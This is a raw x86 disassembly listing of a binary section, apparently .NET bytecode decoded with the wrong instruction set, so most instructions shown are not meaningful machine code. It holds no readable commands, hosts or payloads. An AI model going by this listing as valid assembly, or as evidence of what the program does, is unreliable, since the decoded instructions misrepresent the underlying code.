  4030d1:	0a 0a                	or     (%edx),%cl
  4030d3:	de 30                	fidivs (%eax)
  4030d5:	07                   	pop    %es
  4030d6:	72 23                	jb     0x4030fb
  4030d8:	06                   	push   %es
  4030d9:	00 70 6f             	add    %dh,0x6f(%eax)
  4030dc:	6a 00                	push   $0x0
  4030de:	00 0a                	add    %cl,(%edx)
  4030e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e1:	26 00 00             	add    %al,%es:(%eax)
  4030e4:	0a 0a                	or     (%edx),%cl
  4030e6:	de 1d de 1b 25 28    	ficomps 0x28251bde
  4030ec:	2e 00 00             	add    %al,%cs:(%eax)
  4030ef:	0a 0c 72             	or     (%edx,%esi,2),%cl
  4030f2:	39 05 00 70 0a 28    	cmp    %eax,0x280a7000
  4030f8:	30 00                	xor    %al,(%eax)
  4030fa:	00 0a                	add    %cl,(%edx)
  4030fc:	de 07                	fiadds (%edi)
  4030fe:	28 30                	sub    %dh,(%eax)
  403100:	00 00                	add    %al,(%eax)
  403102:	0a de                	or     %dh,%bl
  403104:	00 06                	add    %al,(%esi)
  403106:	2a 00                	sub    (%eax),%al
  403108:	01 10                	add    %edx,(%eax)
  40310a:	00 00                	add    %al,(%eax)
  40310c:	00 00                	add    %al,(%eax)
  40310e:	00 00                	add    %al,(%eax)
  403110:	66 66 00 1b          	data16 data16 add %bl,(%ebx)
  403114:	32 00                	xor    (%eax),%al
  403116:	00 01                	add    %al,(%ecx)
  403118:	1b 30                	sbb    (%eax),%esi
  40311a:	04 00                	add    $0x0,%al
  40311c:	b9 00 00 00 16       	mov    $0x16000000,%ecx
  403121:	00 00                	add    %al,(%eax)
  403123:	11 14 0c             	adc    %edx,(%esp,%ecx,1)
  403126:	28 08                	sub    %cl,(%eax)
  403128:	00 00                	add    %al,(%eax)
  40312a:	06                   	push   %es
  40312b:	6f                   	outsl  %ds:(%esi),(%dx)
  40312c:	78 00                	js     0x40312e
  40312e:	00 0a                	add    %cl,(%edx)
  403130:	6f                   	outsl  %ds:(%esi),(%dx)
  403131:	79 00                	jns    0x403133
  403133:	00 0a                	add    %cl,(%edx)
  403135:	8c 59 00             	mov    %ds,0x0(%ecx)
  403138:	00 01                	add    %al,(%ecx)
  40313a:	28 7a 00             	sub    %bh,0x0(%edx)
  40313d:	00 0a                	add    %cl,(%edx)
  40313f:	28 7b 00             	sub    %bh,0x0(%ebx)
  403142:	00 0a                	add    %cl,(%edx)
  403144:	b9 0b 07 20 00       	mov    $0x20070b,%ecx
  403149:	00 00                	add    %al,(%eax)
  40314b:	40                   	inc    %eax
  40314c:	6a 31                	push   $0x31
  40314e:	32 07                	xor    (%edi),%al
  403150:	6c                   	insb   (%dx),%es:(%edi)
  403151:	23 00                	and    (%eax),%eax
  403153:	00 00                	add    %al,(%eax)
  403155:	00 00                	add    %al,(%eax)
  403157:	00 d0                	add    %dl,%al
  403159:	41                   	inc    %ecx
  40315a:	5b                   	pop    %ebx
  40315b:	13 04 12             	adc    (%edx,%edx,1),%eax
  40315e:	04 28                	add    $0x28,%al
  403160:	7c 00                	jl     0x403162
  403162:	00 0a                	add    %cl,(%edx)
  403164:	0c 08                	or     $0x8,%al
  403166:	1a 08                	sbb    (%eax),%cl
  403168:	6f                   	outsl  %ds:(%esi),(%dx)
  403169:	6f                   	outsl  %ds:(%esi),(%dx)
  40316a:	00 00                	add    %al,(%eax)
  40316c:	0a 1a                	or     (%edx),%bl
  40316e:	da 6f 7d             	fisubrl 0x7d(%edi)
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 72 91             	or     -0x6f(%edx),%dh
  403176:	06                   	push   %es
  403177:	00 70 28             	add    %dh,0x28(%eax)
  40317a:	2b 00                	sub    (%eax),%eax
  40317c:	00 0a                	add    %cl,(%edx)
  40317e:	0c 2b                	or     $0x2b,%al
  403180:	39 07                	cmp    %eax,(%edi)
  403182:	20 00                	and    %al,(%eax)
  403184:	00 10                	add    %dl,(%eax)
  403186:	00 6a 31             	add    %ch,0x31(%edx)
  403189:	30 07                	xor    %al,(%edi)
  40318b:	6c                   	insb   (%dx),%es:(%edi)
  40318c:	23 00                	and    (%eax),%eax
  40318e:	00 00                	add    %al,(%eax)
  403190:	00 00                	add    %al,(%eax)
  403192:	00 30                	add    %dh,(%eax)
  403194:	41                   	inc    %ecx
  403195:	5b                   	pop    %ebx
  403196:	13 04 12             	adc    (%edx,%edx,1),%eax
  403199:	04 28                	add    $0x28,%al
  40319b:	7c 00                	jl     0x40319d
  40319d:	00 0a                	add    %cl,(%edx)
  40319f:	0c 08                	or     $0x8,%al
  4031a1:	1a 08                	sbb    (%eax),%cl
  4031a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a5:	00 00                	add    %al,(%eax)
  4031a7:	0a 1a                	or     (%edx),%bl
  4031a9:	da 6f 7d             	fisubrl 0x7d(%edi)
  4031ac:	00 00                	add    %al,(%eax)
  4031ae:	0a 72 99             	or     -0x67(%edx),%dh
  4031b1:	06                   	push   %es
  4031b2:	00 70 28             	add    %dh,0x28(%eax)
  4031b5:	2b 00                	sub    (%eax),%eax
  4031b7:	00 0a                	add    %cl,(%edx)
  4031b9:	0c 08                	or     $0x8,%al
  4031bb:	0a de                	or     %dh,%bl
  4031bd:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  4031c2:	2e 00 00             	add    %al,%cs:(%eax)
  4031c5:	0a 0d 72 39 05 00    	or     0x53972,%cl
  4031cb:	70 0a                	jo     0x4031d7
  4031cd:	28 30                	sub    %dh,(%eax)
  4031cf:	00 00                	add    %al,(%eax)
  4031d1:	0a de                	or     %dh,%bl
  4031d3:	07                   	pop    %es
  4031d4:	28 30                	sub    %dh,(%eax)
  4031d6:	00 00                	add    %al,(%eax)
  4031d8:	0a de                	or     %dh,%bl
  4031da:	00 06                	add    %al,(%esi)
  4031dc:	2a 00                	sub    (%eax),%al
  4031de:	00 00                	add    %al,(%eax)
  4031e0:	01 10                	add    %edx,(%eax)
  4031e2:	00 00                	add    %al,(%eax)
  4031e4:	00 00                	add    %al,(%eax)
  4031e6:	00 00                	add    %al,(%eax)
  4031e8:	9c                   	pushf
  4031e9:	9c                   	pushf
  4031ea:	00 1b                	add    %bl,(%ebx)
  4031ec:	32 00                	xor    (%eax),%al
  4031ee:	00 01                	add    %al,(%ecx)
  4031f0:	1b 30                	sbb    (%eax),%esi
  4031f2:	08 00                	or     %al,(%eax)
  4031f4:	c5 01                	lds    (%ecx),%eax
  4031f6:	00 00                	add    %al,(%eax)
  4031f8:	17                   	pop    %ss
  4031f9:	00 00                	add    %al,(%eax)
  4031fb:	11 7e 10             	adc    %edi,0x10(%esi)
  4031fe:	00 00                	add    %al,(%eax)
  403200:	04 2d                	add    $0x2d,%al
  403202:	05 38 b8 01 00       	add    $0x1b838,%eax
  403207:	00 7e 11             	add    %bh,0x11(%esi)
  40320a:	00 00                	add    %al,(%eax)
  40320c:	04 02                	add    $0x2,%al
  40320e:	6f                   	outsl  %ds:(%esi),(%dx)
  40320f:	7e 00                	jle    0x403211
  403211:	00 0a                	add    %cl,(%edx)
  403213:	0a 06                	or     (%esi),%al
  403215:	16                   	push   %ss
  403216:	3e 56                	ds push %esi
  403218:	01 00                	add    %eax,(%eax)
  40321a:	00 7e 12             	add    %bh,0x12(%esi)
  40321d:	00 00                	add    %al,(%eax)
  40321f:	04 15                	add    $0x15,%al
  403221:	6a 40                	push   $0x40
  403223:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403224:	00 00                	add    %al,(%eax)
  403226:	00 7e 13             	add    %bh,0x13(%esi)
  403229:	00 00                	add    %al,(%eax)
  40322b:	04 16                	add    $0x16,%al
  40322d:	91                   	xchg   %eax,%ecx
  40322e:	16                   	push   %ss
  40322f:	40                   	inc    %eax
  403230:	83 00 00             	addl   $0x0,(%eax)
  403233:	00 7e 14             	add    %bh,0x14(%esi)
  403236:	00 00                	add    %al,(%eax)
  403238:	04 6f                	add    $0x6f,%al
  40323a:	7f 00                	jg     0x40323c
  40323c:	00 0a                	add    %cl,(%edx)
  40323e:	28 07                	sub    %al,(%edi)
  403240:	01 00                	add    %eax,(%eax)
  403242:	06                   	push   %es
  403243:	28 80 00 00 0a 80    	sub    %al,-0x7ff60000(%eax)
  403249:	12 00                	adc    (%eax),%al
  40324b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40324e:	14 00                	adc    $0x0,%al
  403250:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403253:	81 00 00 0a 73 49    	addl   $0x49730a00,(%eax)
  403259:	00 00                	add    %al,(%eax)
  40325b:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  403261:	7e 12                	jle    0x403275
  403263:	00 00                	add    %al,(%eax)
  403265:	04 16                	add    $0x16,%al
  403267:	6a 33                	push   $0x33
  403269:	36 15 6a 80 12 00    	ss adc $0x12806a,%eax
  40326f:	00 04 7e             	add    %al,(%esi,%edi,2)
  403272:	11 00                	adc    %eax,(%eax)
  403274:	00 04 7e             	add    %al,(%esi,%edi,2)
  403277:	13 00                	adc    (%eax),%eax
  403279:	00 04 16             	add    %al,(%esi,%edx,1)
  40327c:	7e 13                	jle    0x403291
  40327e:	00 00                	add    %al,(%eax)
  403280:	04 8e                	add    $0x8e,%al
  403282:	b7 16                	mov    $0x16,%bh
  403284:	14 fe                	adc    $0xfe,%al
  403286:	06                   	push   %es
  403287:	43                   	inc    %ebx
  403288:	00 00                	add    %al,(%eax)
  40328a:	06                   	push   %es
  40328b:	73 4e                	jae    0x4032db
  40328d:	00 00                	add    %al,(%eax)
  40328f:	0a 7e 11             	or     0x11(%esi),%bh
  403292:	00 00                	add    %al,(%eax)
  403294:	04 6f                	add    $0x6f,%al
  403296:	4f                   	dec    %edi
  403297:	00 00                	add    %al,(%eax)
  403299:	0a 26                	or     (%esi),%ah
  40329b:	dd 20                	frstor (%eax)
  40329d:	01 00                	add    %eax,(%eax)
  40329f:	00 7e 12             	add    %bh,0x12(%esi)
  4032a2:	00 00                	add    %al,(%eax)
  4032a4:	04 17                	add    $0x17,%al
  4032a6:	6a da                	push   $0xffffffda
  4032a8:	b7 17                	mov    $0x17,%bh
  4032aa:	d6                   	salc
  4032ab:	8d 43 00             	lea    0x0(%ebx),%eax
  4032ae:	00 01                	add    %al,(%ecx)
  4032b0:	80 13 00             	adcb   $0x0,(%ebx)
  4032b3:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4032b6:	11 7e 14             	adc    %edi,0x14(%esi)
  4032b9:	00 00                	add    %al,(%eax)
  4032bb:	04 7e                	add    $0x7e,%al
  4032bd:	13 00                	adc    (%eax),%eax
  4032bf:	00 04 16             	add    %al,(%esi,%edx,1)
  4032c2:	91                   	xchg   %eax,%ecx
  4032c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c4:	82 00 00             	addb   $0x0,(%eax)
  4032c7:	0a 38                	or     (%eax),%bh
  4032c9:	a2 00 00 00 7e       	mov    %al,0x7e000000
  4032ce:	14 00                	adc    $0x0,%al
  4032d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4032d3:	13 00                	adc    (%eax),%eax
  4032d5:	00 04 16             	add    %al,(%esi,%edx,1)
  4032d8:	06                   	push   %es
  4032d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4032da:	83 00 00             	addl   $0x0,(%eax)
  4032dd:	0a 7e 14             	or     0x14(%esi),%bh
  4032e0:	00 00                	add    %al,(%eax)
  4032e2:	04 6f                	add    $0x6f,%al
  4032e4:	84 00                	test   %al,(%eax)
  4032e6:	00 0a                	add    %cl,(%edx)
  4032e8:	7e 12                	jle    0x4032fc
  4032ea:	00 00                	add    %al,(%eax)
  4032ec:	04 33                	add    $0x33,%al
  4032ee:	60                   	pusha
  4032ef:	14 fe                	adc    $0xfe,%al
  4032f1:	06                   	push   %es
  4032f2:	4b                   	dec    %ebx
  4032f3:	00 00                	add    %al,(%eax)
  4032f5:	06                   	push   %es
  4032f6:	73 85                	jae    0x40327d
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 73 86             	or     -0x7a(%ebx),%dh
  4032fd:	00 00                	add    %al,(%eax)
  4032ff:	0a 0b                	or     (%ebx),%cl
  403301:	07                   	pop    %es
  403302:	14 72                	adc    $0x72,%al
  403304:	a1 06 00 70 17       	mov    0x17700006,%eax
  403309:	8d 03                	lea    (%ebx),%eax
  40330b:	00 00                	add    %al,(%eax)
  40330d:	01 0d 09 16 7e 14    	add    %ecx,0x147e1609
  403313:	00 00                	add    %al,(%eax)
  403315:	04 6f                	add    $0x6f,%al
  403317:	7f 00                	jg     0x403319
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	a2 09 14 14 14       	mov    %al,0x14141409
  403320:	17                   	pop    %ss
  403321:	28 87 00 00 0a 26    	sub    %al,0x260a0000(%edi)
  403327:	15 6a 80 12 00       	adc    $0x12806a,%eax
  40332c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40332f:	14 00                	adc    $0x0,%al
  403331:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403334:	81 00 00 0a 73 49    	addl   $0x49730a00,(%eax)
  40333a:	00 00                	add    %al,(%eax)
  40333c:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  403342:	17                   	pop    %ss
  403343:	8d 43 00             	lea    0x0(%ebx),%eax
  403346:	00 01                	add    %al,(%ecx)
  403348:	80 13 00             	adcb   $0x0,(%ebx)
  40334b:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  40334e:	20 7e 12             	and    %bh,0x12(%esi)
  403351:	00 00                	add    %al,(%eax)
  403353:	04 7e                	add    $0x7e,%al
  403355:	14 00                	adc    $0x0,%al
  403357:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40335a:	84 00                	test   %al,(%eax)
  40335c:	00 0a                	add    %cl,(%edx)
  40335e:	da 17                	ficoml (%edi)
  403360:	6a da                	push   $0xffffffda
  403362:	b7 17                	mov    $0x17,%bh
  403364:	d6                   	salc
  403365:	8d 43 00             	lea    0x0(%ebx),%eax
  403368:	00 01                	add    %al,(%ecx)
  40336a:	80 13 00             	adcb   $0x0,(%ebx)
  40336d:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  403370:	08 16                	or     %dl,(%esi)
  403372:	80 10 00             	adcb   $0x0,(%eax)
  403375:	00 04 de             	add    %al,(%esi,%ebx,8)
  403378:	47                   	inc    %edi
  403379:	7e 11                	jle    0x40338c
  40337b:	00 00                	add    %al,(%eax)
  40337d:	04 7e                	add    $0x7e,%al
  40337f:	13 00                	adc    (%eax),%eax
  403381:	00 04 16             	add    %al,(%esi,%edx,1)
  403384:	7e 13                	jle    0x403399
  403386:	00 00                	add    %al,(%eax)
  403388:	04 8e                	add    $0x8e,%al
  40338a:	b7 16                	mov    $0x16,%bh
  40338c:	14 fe                	adc    $0xfe,%al
  40338e:	06                   	push   %es
  40338f:	43                   	inc    %ebx
  403390:	00 00                	add    %al,(%eax)
  403392:	06                   	push   %es
  403393:	73 4e                	jae    0x4033e3
  403395:	00 00                	add    %al,(%eax)
  403397:	0a 7e 11             	or     0x11(%esi),%bh
  40339a:	00 00                	add    %al,(%eax)
  40339c:	04 6f                	add    $0x6f,%al
  40339e:	4f                   	dec    %edi
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	0a 26                	or     (%esi),%ah
  4033a3:	de 1b                	ficomps (%ebx)
  4033a5:	25 28 2e 00 00       	and    $0x2e28,%eax
  4033aa:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4033ad:	80 10 00             	adcb   $0x0,(%eax)
  4033b0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4033b3:	30 00                	xor    %al,(%eax)
  4033b5:	00 0a                	add    %cl,(%edx)
  4033b7:	de 07                	fiadds (%edi)
  4033b9:	28 30                	sub    %dh,(%eax)
  4033bb:	00 00                	add    %al,(%eax)
  4033bd:	0a de                	or     %dh,%bl
  4033bf:	00 2a                	add    %ch,(%edx)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 41 1c             	add    %al,0x1c(%ecx)
  4033c6:	00 00                	add    %al,(%eax)
  4033c8:	00 00                	add    %al,(%eax)
  4033ca:	00 00                	add    %al,(%eax)
  4033cc:	0c 00                	or     $0x0,%al
  4033ce:	00 00                	add    %al,(%eax)
  4033d0:	9d                   	popf
  4033d1:	01 00                	add    %eax,(%eax)
  4033d3:	00 a9 01 00 00 1b    	add    %ch,0x1b000001(%ecx)
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	00 32                	add    %dh,(%edx)
  4033dd:	00 00                	add    %al,(%eax)
  4033df:	01 1b                	add    %ebx,(%ebx)
  4033e1:	30 02                	xor    %al,(%edx)
  4033e3:	00 17                	add    %dl,(%edi)
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 18                	add    %bl,(%eax)
  4033e9:	00 00                	add    %al,(%eax)
  4033eb:	11 02                	adc    %eax,(%edx)
  4033ed:	28 77 00             	sub    %dh,0x0(%edi)
  4033f0:	00 06                	add    %al,(%esi)
  4033f2:	de 0e                	fimuls (%esi)
  4033f4:	25 28 2e 00 00       	and    $0x2e28,%eax
  4033f9:	0a 0a                	or     (%edx),%cl
  4033fb:	28 30                	sub    %dh,(%eax)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	0a de                	or     %dh,%bl
  403401:	00 2a                	add    %ch,(%edx)
  403403:	00 01                	add    %al,(%ecx)
  403405:	10 00                	adc    %al,(%eax)
  403407:	00 00                	add    %al,(%eax)
  403409:	00 00                	add    %al,(%eax)
  40340b:	00 08                	add    %cl,(%eax)
  40340d:	08 00                	or     %al,(%eax)
  40340f:	0e                   	push   %cs
  403410:	32 00                	xor    (%eax),%al
  403412:	00 01                	add    %al,(%ecx)
  403414:	1b 30                	sbb    (%eax),%esi
  403416:	07                   	pop    %es
  403417:	00 c9                	add    %cl,%cl
  403419:	00 00                	add    %al,(%eax)
  40341b:	00 19                	add    %bl,(%ecx)
  40341d:	00 00                	add    %al,(%eax)
  40341f:	11 7e 17             	adc    %edi,0x17(%esi)
  403422:	00 00                	add    %al,(%eax)
  403424:	04 13                	add    $0x13,%al
  403426:	04 11                	add    $0x11,%al
  403428:	04 28                	add    $0x28,%al
  40342a:	88 00                	mov    %al,(%eax)
  40342c:	00 0a                	add    %cl,(%edx)
  40342e:	16                   	push   %ss
  40342f:	13 05 11 04 12 05    	adc    0x5120411,%eax
  403435:	28 89 00 00 0a 7e    	sub    %cl,0x7e0a0000(%ecx)
  40343b:	10 00                	adc    %al,(%eax)
  40343d:	00 04 39             	add    %al,(%ecx,%edi,1)
  403440:	96                   	xchg   %eax,%esi
  403441:	00 00                	add    %al,(%eax)
  403443:	00 73 49             	add    %dh,0x49(%ebx)
  403446:	00 00                	add    %al,(%eax)
  403448:	0a 0a                	or     (%edx),%cl
  40344a:	02 28                	add    (%eax),%ch
  40344c:	06                   	push   %es
  40344d:	01 00                	add    %eax,(%eax)
  40344f:	06                   	push   %es
  403450:	28 0e                	sub    %cl,(%esi)
  403452:	01 00                	add    %eax,(%eax)
  403454:	06                   	push   %es
  403455:	0b 07                	or     (%edi),%eax
  403457:	8e b7 28 8a 00 00    	mov    0x8a28(%edi),%?
  40345d:	0a 72 ad             	or     -0x53(%edx),%dh
  403460:	06                   	push   %es
  403461:	00 70 28             	add    %dh,0x28(%eax)
  403464:	2b 00                	sub    (%eax),%eax
  403466:	00 0a                	add    %cl,(%edx)
  403468:	28 06                	sub    %al,(%esi)
  40346a:	01 00                	add    %eax,(%eax)
  40346c:	06                   	push   %es
  40346d:	0c 06                	or     $0x6,%al
  40346f:	08 16                	or     %dl,(%esi)
  403471:	08 8e b7 6f 83 00    	or     %cl,0x836fb7(%esi)
  403477:	00 0a                	add    %cl,(%edx)
  403479:	06                   	push   %es
  40347a:	07                   	pop    %es
  40347b:	16                   	push   %ss
  40347c:	07                   	pop    %es
  40347d:	8e b7 6f 83 00 00    	mov    0x836f(%edi),%?
  403483:	0a 7e 11             	or     0x11(%esi),%bh
  403486:	00 00                	add    %al,(%eax)
  403488:	04 15                	add    $0x15,%al
  40348a:	17                   	pop    %ss
  40348b:	6f                   	outsl  %ds:(%esi),(%dx)
  40348c:	8b 00                	mov    (%eax),%eax
  40348e:	00 0a                	add    %cl,(%edx)
  403490:	26 7e 11             	es jle 0x4034a4
  403493:	00 00                	add    %al,(%eax)
  403495:	04 06                	add    $0x6,%al
  403497:	6f                   	outsl  %ds:(%esi),(%dx)
  403498:	7f 00                	jg     0x40349a
  40349a:	00 0a                	add    %cl,(%edx)
  40349c:	16                   	push   %ss
  40349d:	06                   	push   %es
  40349e:	6f                   	outsl  %ds:(%esi),(%dx)
  40349f:	84 00                	test   %al,(%eax)
  4034a1:	00 0a                	add    %cl,(%edx)
  4034a3:	b7 16                	mov    $0x16,%bh
  4034a5:	14 fe                	adc    $0xfe,%al
  4034a7:	06                   	push   %es
  4034a8:	46                   	inc    %esi
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	06                   	push   %es
  4034ac:	73 4e                	jae    0x4034fc
  4034ae:	00 00                	add    %al,(%eax)
  4034b0:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  4034b3:	8c 00                	mov    %es,(%eax)
  4034b5:	00 0a                	add    %cl,(%edx)
  4034b7:	26 de 0a             	fimuls %es:(%edx)
  4034ba:	06                   	push   %es
  4034bb:	2c 06                	sub    $0x6,%al
  4034bd:	06                   	push   %es
  4034be:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bf:	6d                   	insl   (%dx),%es:(%edi)
  4034c0:	00 00                	add    %al,(%eax)
  4034c2:	0a dc                	or     %ah,%bl
  4034c4:	de 14 25 28 2e 00 00 	ficoms 0x2e28(,%eiz,1)
  4034cb:	0a 0d 16 80 10 00    	or     0x108016,%cl
  4034d1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4034d4:	30 00                	xor    %al,(%eax)
  4034d6:	00 0a                	add    %cl,(%edx)
  4034d8:	de 00                	fiadds (%eax)
  4034da:	de 0c 11             	fimuls (%ecx,%edx,1)
  4034dd:	05 2c 07 11 04       	add    $0x411072c,%eax
  4034e2:	28 8d 00 00 0a dc    	sub    %cl,-0x23f60000(%ebp)
  4034e8:	2a 00                	sub    (%eax),%al
  4034ea:	00 00                	add    %al,(%eax)
  4034ec:	01 28                	add    %ebp,(%eax)
  4034ee:	00 00                	add    %al,(%eax)
  4034f0:	02 00                	add    (%eax),%al
  4034f2:	2a 00                	sub    (%eax),%al
  4034f4:	70 9a                	jo     0x403490
  4034f6:	00 0a                	add    %cl,(%edx)
  4034f8:	00 00                	add    %al,(%eax)
  4034fa:	00 00                	add    %al,(%eax)
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	24 00                	and    $0x0,%al
  403500:	82 a6 00 14 32 00 00 	andb   $0x0,0x321400(%esi)
  403507:	01 02                	add    %eax,(%edx)
  403509:	00 11                	add    %dl,(%ecx)
  40350b:	00 ab bc 00 0c 00    	add    %ch,0xc00bc(%ebx)
  403511:	00 00                	add    %al,(%eax)
  403513:	00 1b                	add    %bl,(%ebx)
  403515:	30 02                	xor    %al,(%edx)
  403517:	00 23                	add    %ah,(%ebx)
  403519:	00 00                	add    %al,(%eax)
  40351b:	00 18                	add    %bl,(%eax)
  40351d:	00 00                	add    %al,(%eax)
  40351f:	11 7e 11             	adc    %edi,0x11(%esi)
  403522:	00 00                	add    %al,(%eax)
  403524:	04 02                	add    $0x2,%al
  403526:	6f                   	outsl  %ds:(%esi),(%dx)
  403527:	8e 00                	mov    (%eax),%es
  403529:	00 0a                	add    %cl,(%edx)
  40352b:	26 de 14 25 28 2e 00 	ficoms %es:0x2e28(,%eiz,1)
  403532:	00 
  403533:	0a 0a                	or     (%edx),%cl
  403535:	16                   	push   %ss
  403536:	80 10 00             	adcb   $0x0,(%eax)
  403539:	00 04 28             	add    %al,(%eax,%ebp,1)
  40353c:	30 00                	xor    %al,(%eax)
  40353e:	00 0a                	add    %cl,(%edx)
  403540:	de 00                	fiadds (%eax)
  403542:	2a 00                	sub    (%eax),%al
  403544:	01 10                	add    %edx,(%eax)
  403546:	00 00                	add    %al,(%eax)
  403548:	00 00                	add    %al,(%eax)
  40354a:	00 00                	add    %al,(%eax)
  40354c:	0e                   	push   %cs
  40354d:	0e                   	push   %cs
  40354e:	00 14 32             	add    %dl,(%edx,%esi,1)
  403551:	00 00                	add    %al,(%eax)
  403553:	01 1b                	add    %ebx,(%ebx)
  403555:	30 02                	xor    %al,(%edx)
  403557:	00 b6 00 00 00 1a    	add    %dh,0x1a000000(%esi)
  40355d:	00 00                	add    %al,(%eax)
  40355f:	11 7e 15             	adc    %edi,0x15(%esi)
  403562:	00 00                	add    %al,(%eax)
  403564:	04 2c                	add    $0x2c,%al
  403566:	20 7e 15             	and    %bh,0x15(%esi)
  403569:	00 00                	add    %al,(%eax)
  40356b:	04 6f                	add    $0x6f,%al
  40356d:	8f 00                	pop    (%eax)
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	14 80                	adc    $0x80,%al
  403573:	15 00 00 04 de       	adc    $0xde040000,%eax
  403578:	0e                   	push   %cs
  403579:	25 28 2e 00 00       	and    $0x2e28,%eax
  40357e:	0a 0a                	or     (%edx),%cl
  403580:	28 30                	sub    %dh,(%eax)
  403582:	00 00                	add    %al,(%eax)
  403584:	0a de                	or     %dh,%bl
  403586:	00 7e 18             	add    %bh,0x18(%esi)
  403589:	00 00                	add    %al,(%eax)
  40358b:	04 2c                	add    $0x2c,%al
  40358d:	20 7e 18             	and    %bh,0x18(%esi)
  403590:	00 00                	add    %al,(%eax)
  403592:	04 6f                	add    $0x6f,%al
  403594:	8f 00                	pop    (%eax)
  403596:	00 0a                	add    %cl,(%edx)
  403598:	14 80                	adc    $0x80,%al
  40359a:	18 00                	sbb    %al,(%eax)
  40359c:	00 04 de             	add    %al,(%esi,%ebx,8)
  40359f:	0e                   	push   %cs
  4035a0:	25 28 2e 00 00       	and    $0x2e28,%eax
  4035a5:	0a 0b                	or     (%ebx),%cl
  4035a7:	28 30                	sub    %dh,(%eax)
  4035a9:	00 00                	add    %al,(%eax)
  4035ab:	0a de                	or     %dh,%bl
  4035ad:	00 7e 14             	add    %bh,0x14(%esi)
  4035b0:	00 00                	add    %al,(%eax)
  4035b2:	04 2c                	add    $0x2c,%al
  4035b4:	2a 7e 14             	sub    0x14(%esi),%bh
  4035b7:	00 00                	add    %al,(%eax)
  4035b9:	04 6f                	add    $0x6f,%al
  4035bb:	90                   	nop
  4035bc:	00 00                	add    %al,(%eax)
  4035be:	0a 7e 14             	or     0x14(%esi),%bh
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	04 6f                	add    $0x6f,%al
  4035c5:	81 00 00 0a 14 80    	addl   $0x80140a00,(%eax)
  4035cb:	14 00                	adc    $0x0,%al
  4035cd:	00 04 de             	add    %al,(%esi,%ebx,8)
  4035d0:	0e                   	push   %cs
  4035d1:	25 28 2e 00 00       	and    $0x2e28,%eax
  4035d6:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4035d9:	30 00                	xor    %al,(%eax)
  4035db:	00 0a                	add    %cl,(%edx)
  4035dd:	de 00                	fiadds (%eax)
  4035df:	7e 11                	jle    0x4035f2
  4035e1:	00 00                	add    %al,(%eax)
  4035e3:	04 2c                	add    $0x2c,%al
  4035e5:	2a 7e 11             	sub    0x11(%esi),%bh
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	04 6f                	add    $0x6f,%al
  4035ec:	91                   	xchg   %eax,%ecx
  4035ed:	00 00                	add    %al,(%eax)
  4035ef:	0a 7e 11             	or     0x11(%esi),%bh
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	04 6f                	add    $0x6f,%al
  4035f6:	92                   	xchg   %eax,%edx
  4035f7:	00 00                	add    %al,(%eax)
  4035f9:	0a 14 80             	or     (%eax,%eax,4),%dl
  4035fc:	11 00                	adc    %eax,(%eax)
  4035fe:	00 04 de             	add    %al,(%esi,%ebx,8)
  403601:	0e                   	push   %cs
  403602:	25 28 2e 00 00       	and    $0x2e28,%eax
  403607:	0a 0d 28 30 00 00    	or     0x3028,%cl
  40360d:	0a de                	or     %dh,%bl
  40360f:	00 28                	add    %ch,(%eax)
  403611:	93                   	xchg   %eax,%ebx
  403612:	00 00                	add    %al,(%eax)
  403614:	0a 2a                	or     (%edx),%ch
  403616:	00 00                	add    %al,(%eax)
  403618:	01 34 00             	add    %esi,(%eax,%eax,1)
  40361b:	00 00                	add    %al,(%eax)
  40361d:	00 07                	add    %al,(%edi)
  40361f:	00 12                	add    %dl,(%edx)
  403621:	19 00                	sbb    %eax,(%eax)
  403623:	0e                   	push   %cs
  403624:	32 00                	xor    (%eax),%al
  403626:	00 01                	add    %al,(%ecx)
  403628:	00 00                	add    %al,(%eax)
  40362a:	2e 00 12             	add    %dl,%cs:(%edx)
  40362d:	40                   	inc    %eax
  40362e:	00 0e                	add    %cl,(%esi)
  403630:	32 00                	xor    (%eax),%al
  403632:	00 01                	add    %al,(%ecx)
  403634:	00 00                	add    %al,(%eax)
  403636:	55                   	push   %ebp
  403637:	00 1c 71             	add    %bl,(%ecx,%esi,2)
  40363a:	00 0e                	add    %cl,(%esi)
  40363c:	32 00                	xor    (%eax),%al
  40363e:	00 01                	add    %al,(%ecx)
  403640:	00 00                	add    %al,(%eax)
  403642:	86 00                	xchg   %al,(%eax)
  403644:	1c a2                	sbb    $0xa2,%al
  403646:	00 0e                	add    %cl,(%esi)
  403648:	32 00                	xor    (%eax),%al
  40364a:	00 01                	add    %al,(%ecx)
  40364c:	1b 30                	sbb    (%eax),%esi
  40364e:	02 00                	add    (%eax),%al
